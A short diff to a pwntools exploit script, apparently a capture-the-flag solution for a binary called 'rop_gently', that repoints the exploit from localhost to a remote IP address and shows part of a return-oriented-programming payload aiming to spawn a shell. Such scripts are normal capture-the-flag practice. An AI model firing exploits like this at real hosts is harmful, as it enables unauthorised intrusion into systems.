@@ -1,7 +1,7 @@
 from pwn import *
 import time
 
-context.binary = binary = ELF('./rop_gently', checksec=False)
+context.binary = binary = ELF('./dist/rop_gently', checksec=False)
 context.log_level = 'info'
 
 def solve():
@@ -76,7 +76,7 @@ def solve():
     
     payload2 = p64(0xdeadbeef) + c + binsh_data
     
-    io = remote('localhost', 1339)
+    io = remote('148.135.137.178', 1339)
             
     io.recvuntil(b"Can you ROP your way out of this?\n")
     io.send(payload1)
